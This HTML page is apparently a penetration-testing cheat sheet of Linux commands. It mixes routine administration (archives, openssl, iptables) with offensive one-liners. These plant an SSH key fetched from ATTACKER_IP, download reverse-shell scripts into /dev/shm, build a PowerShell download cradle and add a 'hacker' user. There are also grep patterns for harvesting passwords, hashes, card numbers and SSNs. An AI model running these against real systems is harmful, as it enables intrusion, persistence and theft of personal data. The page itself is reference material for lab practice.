<h1 id="Useful-Linux-Commands"><a href="#Useful-Linux-Commands" class="headerlink" title="Useful Linux Commands"></a>Useful Linux Commands</h1><h2 id="Common-Bash"><a href="#Common-Bash" class="headerlink" title="Common Bash"></a>Common Bash</h2><pre><code class="bash">#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d &#39;\n&#39;

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authotized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l &lt;file&gt; #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i &#39;s/OLD/NEW/g&#39; path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof -i #Files uses by networks processes
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p &#39;openssl passwd -1 &lt;Password&gt;&#39; hacker  

#Clipboard
xclip -sel c &lt; cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;
php -S $ip:80

##Curl
#json data
curl --header &quot;Content-Type: application/json&quot; --request POST --data &#39;{&quot;password&quot;:&quot;password&quot;, &quot;username&quot;:&quot;admin&quot;}&#39; http://host:3000/endpoint
#Auth via JWT
curl -X GET -H &#39;Authorization: Bearer &lt;JWT&gt;&#39; http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

## ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

## Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the &quot;Organizatoin Name&quot;(Fortune) and the &quot;Common Name&quot; (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
## If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k &lt;KEY&gt; -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u &quot;ls&quot;

##Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path &quot;/proc/*&quot; -not -path &quot;/sys/*&quot; -ls 2&gt;/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from wich package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo &quot;CIKUmMesGw==&quot; | base64 -d | protoc --decode_raw
</code></pre>
<h2 id="Bash-for-Windows"><a href="#Bash-for-Windows" class="headerlink" title="Bash for Windows"></a>Bash for Windows</h2><pre><code class="bash">#Base64 for Windows
echo -n &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.9:8000/9002.ps1&#39;)&quot; | iconv --to-code UTF-16LE | base64 -w0
 
#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853  
python pyinstaller.py --onefile exploit.py

#Compile for windows
i586-mingw32msvc-gcc -o executable useradd.c
</code></pre>
<h2 id="Greps"><a href="#Greps" class="headerlink" title="Greps"></a>Greps</h2><pre><code class="bash">#Extract emails from file
grep -E -o &quot;\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b&quot; file.txt

#Extract valid IP addresses
grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot; file.txt

#Extract passwords
grep -i &quot;pwd\|passw&quot; file.txt

#Extract users
grep -i &quot;user\|invalid\|authentication\|login&quot; file.txt

## Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE &#39;(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)&#39; *.txt | egrep -o &#39;[a-fA-F0-9]{32}&#39; &gt; md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e &quot;[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}&quot; *.txt &gt; mysql-old-hashes.txt
#Extract blowfish hashes
grep -e &quot;$2a\$\08\$(.){75}&quot; *.txt &gt; blowfish-hashes.txt
#Extract Joomla hashes
egrep -o &quot;([0-9a-zA-Z]{32}):(w{16,32})&quot; *.txt &gt; joomla.txt
#Extract VBulletin hashes
egrep -o &quot;([0-9a-zA-Z]{32}):(S{3,32})&quot; *.txt &gt; vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o &#39;$H$S{31}&#39; *.txt &gt; phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o &#39;$P$S{31}&#39; *.txt &gt; wordpress-md5.txt
#Extract Drupal 7
egrep -o &#39;$S$S{52}&#39; *.txt &gt; drupal-7.txt
#Extract old Unix-md5
egrep -o &#39;$1$w{8}S{22}&#39; *.txt &gt; md5-unix-old.txt
#Extract md5-apr1
egrep -o &#39;$apr1$w{8}S{22}&#39; *.txt &gt; md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o &#39;$6$w{8}S{86}&#39; *.txt &gt; sha512crypt.txt

#Extract e-mails from text files
grep -E -o &quot;\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b&quot; *.txt &gt; e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP &#39;http.*?[&quot; &gt;]&#39; *.txt &gt; http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E &#39;(((https|ftp|gopher)|mailto)[.:][^ &gt;&quot;    ]*|www.[-a-z0-9.]+)[^ .,;    &gt;&quot;&gt;):]&#39; *.txt &gt; urls.txt
#Note: if grep returns &quot;Binary file (standard input) matches&quot; use the following approaches # tr &#39;[\000-\011\013-\037177-377]&#39; &#39;.&#39; &lt; *.log | grep -E &quot;Your_Regex&quot; OR # cat -v *.log | egrep -o &quot;Your_Regex&quot;

#Extract Floating point numbers
grep -E -o &quot;^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$&quot; *.txt &gt; floats.txt

## Extract credit card data
#Visa
grep -E -o &quot;4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&quot; *.txt &gt; visa.txt
#MasterCard
grep -E -o &quot;5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&quot; *.txt &gt; mastercard.txt
#American Express
grep -E -o &quot;\b3[47][0-9]{13}\b&quot; *.txt &gt; american-express.txt
#Diners Club
grep -E -o &quot;\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b&quot; *.txt &gt; diners.txt
#Discover
grep -E -o &quot;6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}&quot; *.txt &gt; discover.txt
#JCB
grep -E -o &quot;\b(?:2131|1800|35d{3})d{11}\b&quot; *.txt &gt; jcb.txt
#AMEX
grep -E -o &quot;3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}&quot; *.txt &gt; amex.txt

## Extract IDs
#Extract Social Security Number (SSN)
grep -E -o &quot;[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}&quot; *.txt &gt; ssn.txt
#Extract Indiana Driver License Number
grep -E -o &quot;[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}&quot; *.txt &gt; indiana-dln.txt
#Extract US Passport Cards
grep -E -o &quot;C0[0-9]{7}&quot; *.txt &gt; us-pass-card.txt
#Extract US Passport Number
grep -E -o &quot;[23][0-9]{8}&quot; *.txt &gt; us-pass-num.txt
#Extract US Phone Numberss
grep -Po &#39;d{3}[s-_]?d{3}[s-_]?d{4}&#39; *.txt &gt; us-phones.txt
#Extract ISBN Numbers
egrep -a -o &quot;\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b&quot; *.txt &gt; isbn.txt
</code></pre>
<h2 id="Nmap-search-help"><a href="#Nmap-search-help" class="headerlink" title="Nmap search help"></a>Nmap search help</h2><pre><code class="bash">#Nmap scripts ((default or version) and smb))
nmap --script-help &quot;(default or version) and *smb*&quot;
locate -r &#39;\.nse$&#39; | xargs grep categories | grep &#39;default\|version\|safe&#39; | grep smb
nmap --script-help &quot;(default or version) and smb)&quot;
</code></pre>
<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><pre><code class="bash">#All bytes inside a file (except 0x20 and 0x00)
for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v &quot;20\|00&quot;); do echo -n -e &quot;\x$j&quot; &gt;&gt; bytes; done
</code></pre>
<h2 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a>Iptables</h2><pre><code class="bash">#Delete curent rules and chains
iptables --flush
iptables --delete-chain

#allow loopback
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

#drop ICMP
iptables -A INPUT -p icmp -m icmp --icmp-type any -j DROP
iptables -A OUTPUT -p icmp -j DROP

#allow established connections
iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT

#allow ssh, http, https, dns
iptables -A INPUT -s 10.10.10.10/24 -p tcp -m tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 443 -j ACCEPT
iptables -A INPUT -p udp -m udp --sport 53 -j ACCEPT
iptables -A INPUT -p tcp -m tcp --sport 53 -j ACCEPT
iptables -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT
iptables -A OUTPUT -p tcp -m tcp --dport 53 -j ACCEPT

#default policies
iptables -P INPUT DROP
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
</code></pre>
